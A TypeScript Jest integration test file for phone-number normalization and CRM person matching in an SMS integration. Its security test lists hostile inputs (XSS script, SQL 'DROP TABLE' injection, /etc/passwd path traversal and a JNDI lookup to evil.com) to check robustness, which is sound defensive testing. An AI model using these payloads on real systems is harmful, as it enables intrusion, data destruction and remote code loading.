/**
 * Integration Tests for Phone Number Utilities
 * Slice 2a: Phone Number Utilities - Twenty CRM TRIB SMS Integration
 *
 * End-to-end workflow validation: TRIB SMS input → normalization → matching → Twenty CRM result
 */

import {
  normalizePhoneNumber,
  getPhoneVariations,
} from '../../src/utils/phone/phone-normalizer';
import {
  findPersonByPrimaryOrAdditionalPhone,
  matchPersonByPhone,
} from '../../src/utils/phone/phone-matcher';
import { PersonPhone } from '../../src/interfaces/person.repository.interface';

describe('Phone Number Utilities Integration', () => {
  // Realistic Twenty CRM person data for integration testing
  const twentyCrmPeople: PersonPhone[] = [
    {
      id: 'crm-person-1',
      primaryPhoneNumber: '+15551234567',
      primaryPhoneCountryCode: 'US',
      phone: null,
      additionalPhones: [
        {
          number: '+15559876543',
          countryCode: 'US',
          callingCode: '+1',
        },
      ],
    },
    {
      id: 'crm-person-2',
      primaryPhoneNumber: null,
      primaryPhoneCountryCode: null,
      phone: '+15555555555', // Legacy field usage
      additionalPhones: null,
    },
    {
      id: 'crm-person-3',
      primaryPhoneNumber: '+442079460958',
      primaryPhoneCountryCode: 'GB',
      phone: null,
      additionalPhones: [
        {
          number: '+442075551234',
          countryCode: 'GB',
          callingCode: '+44',
        },
        {
          number: '+15551112222',
          countryCode: 'US',
          callingCode: '+1',
        },
      ],
    },
  ];

  describe('Complete TRIB SMS to Twenty CRM Workflow', () => {
    it('should handle complete workflow: raw TRIB SMS phone → normalized → matched person', () => {
      // Simulate raw phone number from TRIB SMS webhook
      const tribSmsPhone = '(555) 123-4567';

      // Step 1: Normalize the phone number
      const normalized = normalizePhoneNumber(tribSmsPhone);
      expect(normalized).toBe('+15551234567');

      // Step 2: Generate variations for database matching
      const variations = getPhoneVariations(tribSmsPhone);
      expect(variations).toContain('+15551234567');
      expect(variations).toContain('15551234567');
      expect(variations).toContain('5551234567');

      // Step 3: Match against Twenty CRM person records
      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: tribSmsPhone,
      });

      // Step 4: Verify successful match
      expect(matchedPerson).toBeDefined();
      expect(matchedPerson?.id).toBe('crm-person-1');
      expect(matchedPerson?.primaryPhoneNumber).toBe('+15551234567');
    });

    it('should handle TRIB SMS phone matching via additional phones', () => {
      const tribSmsPhone = '555.987.6543';

      const normalized = normalizePhoneNumber(tribSmsPhone);
      expect(normalized).toBe('+15559876543');

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: tribSmsPhone,
      });

      expect(matchedPerson).toBeDefined();
      expect(matchedPerson?.id).toBe('crm-person-1');

      // Verify it matched via additional phone, not primary
      expect(matchedPerson?.primaryPhoneNumber).toBe('+15551234567');
      expect(matchedPerson?.additionalPhones?.[0]?.number).toBe('+15559876543');
    });

    it('should handle TRIB SMS phone matching via legacy phone field', () => {
      const tribSmsPhone = '555-555-5555';

      const normalized = normalizePhoneNumber(tribSmsPhone);
      expect(normalized).toBe('+15555555555');

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: tribSmsPhone,
      });

      expect(matchedPerson).toBeDefined();
      expect(matchedPerson?.id).toBe('crm-person-2');
      expect(matchedPerson?.phone).toBe('+15555555555');
      expect(matchedPerson?.primaryPhoneNumber).toBeNull();
    });

    it('should handle international TRIB SMS phone matching', () => {
      const tribSmsPhone = '020 7946 0958'; // UK local format from TRIB SMS

      const normalized = normalizePhoneNumber(tribSmsPhone, 'GB');
      expect(normalized).toBe('+442079460958');

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: normalized, // Use normalized format for matching
      });

      expect(matchedPerson).toBeDefined();
      expect(matchedPerson?.id).toBe('crm-person-3');
      expect(matchedPerson?.primaryPhoneCountryCode).toBe('GB');
    });

    it('should provide detailed match context with matchPersonByPhone', () => {
      const tribSmsPhone = '+1 (555) 111-2222';

      const result = matchPersonByPhone(twentyCrmPeople, tribSmsPhone);

      expect(result.person).toBeDefined();
      expect(result.person?.id).toBe('crm-person-3');
      expect(result.matchType).toBe('additional');
      expect(result.normalizedPhone).toBe('+15551112222');
      expect(result.ambiguous).toBe(false);

      // Verify it's the right additional phone
      const additionalPhone = result.person?.additionalPhones?.find(
        (phone) => phone.number === '+15551112222',
      );
      expect(additionalPhone).toBeDefined();
      expect(additionalPhone?.countryCode).toBe('US');
    });
  });

  describe('Error Handling and Edge Cases Integration', () => {
    it('should handle complete workflow with invalid TRIB SMS phone', () => {
      const invalidTribSmsPhone = 'not-a-phone-number';

      const normalized = normalizePhoneNumber(invalidTribSmsPhone);
      expect(normalized).toBeNull();

      const variations = getPhoneVariations(invalidTribSmsPhone);
      expect(variations).toEqual(['not-a-phone-number']);

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: invalidTribSmsPhone,
      });
      expect(matchedPerson).toBeUndefined();

      const result = matchPersonByPhone(twentyCrmPeople, invalidTribSmsPhone);
      expect(result.person).toBeNull();
      expect(result.matchType).toBe('none');
      expect(result.normalizedPhone).toBeNull();
    });

    it('should handle workflow with no matching Twenty CRM person', () => {
      const tribSmsPhone = '(999) 999-9999';

      const normalized = normalizePhoneNumber(tribSmsPhone);
      expect(normalized).toBe('+19999999999');

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: twentyCrmPeople,
        phoneNumber: tribSmsPhone,
      });
      expect(matchedPerson).toBeUndefined();

      const result = matchPersonByPhone(twentyCrmPeople, tribSmsPhone);
      expect(result.person).toBeNull();
      expect(result.matchType).toBe('none');
      expect(result.normalizedPhone).toBe('+19999999999');
      expect(result.ambiguous).toBe(false);
    });

    it('should handle mixed format phone numbers in Twenty CRM data', () => {
      const mixedFormatPeople: PersonPhone[] = [
        {
          id: 'mixed-1',
          primaryPhoneNumber: '5551234567', // No country code
          primaryPhoneCountryCode: 'US',
          phone: null,
          additionalPhones: [],
        },
        {
          id: 'mixed-2',
          primaryPhoneNumber: '+1-555-123-4567', // Different formatting
          primaryPhoneCountryCode: 'US',
          phone: null,
          additionalPhones: [],
        },
      ];

      const tribSmsPhone = '(555) 123-4567';

      // Both should match the same normalized form
      const result1 = findPersonByPrimaryOrAdditionalPhone({
        people: mixedFormatPeople,
        phoneNumber: tribSmsPhone,
      });

      // Should find the first match (mixed-1)
      expect(result1?.id).toBe('mixed-1');
    });
  });

  describe('Performance and Scale Integration', () => {
    it('should handle realistic Twenty CRM dataset size efficiently', () => {
      // Create a realistic dataset size (1000 person records)
      const largeTwentyCrmDataset: PersonPhone[] = Array.from(
        { length: 1000 },
        (_, i) => ({
          id: `perf-person-${i}`,
          primaryPhoneNumber: `+1555${i.toString().padStart(7, '0')}`,
          primaryPhoneCountryCode: 'US',
          phone: i % 3 === 0 ? `+1666${i.toString().padStart(7, '0')}` : null,
          additionalPhones:
            i % 2 === 0
              ? [
                  {
                    number: `+1777${i.toString().padStart(7, '0')}`,
                    countryCode: 'US',
                    callingCode: '+1',
                  },
                ]
              : [],
        }),
      );

      const tribSmsPhone = '+1 555 000 0500'; // Should match perf-person-500

      const startTime = Date.now();

      const matchedPerson = findPersonByPrimaryOrAdditionalPhone({
        people: largeTwentyCrmDataset,
        phoneNumber: tribSmsPhone,
      });

      const endTime = Date.now();

      expect(matchedPerson).toBeDefined();
      expect(matchedPerson?.id).toBe('perf-person-500');
      expect(endTime - startTime).toBeLessThan(50); // Should be very fast
    });

    it('should handle phone variations efficiently with large dataset', () => {
      const tribSmsPhone = '(555) 123-4567';

      const startTime = Date.now();

      const variations = getPhoneVariations(tribSmsPhone);
      const normalized = normalizePhoneNumber(tribSmsPhone);

      const endTime = Date.now();

      expect(variations.length).toBeGreaterThan(3);
      expect(normalized).toBe('+15551234567');
      expect(endTime - startTime).toBeLessThan(10); // Should be very fast
    });
  });

  describe('Security Integration Testing', () => {
    it('should handle complete workflow with potentially malicious TRIB SMS input', () => {
      const maliciousInputs = [
        'javascript:alert(1)',
        '<script>alert("xss")</script>',
        '555-123-4567; DROP TABLE persons;',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      maliciousInputs.forEach((maliciousPhone) => {
        expect(() => {
          const normalized = normalizePhoneNumber(maliciousPhone);
          const variations = getPhoneVariations(maliciousPhone);
          const matched = findPersonByPrimaryOrAdditionalPhone({
            people: twentyCrmPeople,
            phoneNumber: maliciousPhone,
          });
          const result = matchPersonByPhone(twentyCrmPeople, maliciousPhone);
        }).not.toThrow();
      });
    });

    it('should log security events appropriately', () => {
      // Test that overly long phone numbers trigger security logging
      const longPhone = '1'.repeat(60);

      const normalized = normalizePhoneNumber(longPhone);
      expect(normalized).toBeNull(); // Should reject

      const result = matchPersonByPhone(twentyCrmPeople, longPhone);
      expect(result.person).toBeNull();
      expect(result.normalizedPhone).toBeNull();
    });
  });
});
